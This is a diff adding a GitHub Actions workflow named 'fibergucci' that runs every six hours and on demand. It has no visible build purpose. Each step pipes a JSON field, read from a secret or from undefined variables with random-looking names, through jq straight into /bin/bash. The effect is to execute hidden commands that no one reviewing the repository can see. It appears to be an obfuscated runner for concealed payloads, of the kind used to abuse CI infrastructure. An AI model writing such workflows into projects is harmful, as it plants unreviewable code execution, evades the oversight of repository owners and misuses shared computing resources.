@@ -1,0 +1,20 @@
+name: fibergucci
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fibergucci
+        env:
+          sy27: ${{ secrets.sy27 }}
+        run: |
+          echo $sy27 | jq -r .tldtb3389 | /bin/bash
+          echo $q13351 | jq -r .ny71 | /bin/bash
+          echo $xv97 | jq -r .zbha3371 | /bin/bash
+          echo $bmez7522 | jq -r .zqicp340 | /bin/bash
+          echo $l411 | jq -r .pfa59418 | /bin/bash
+
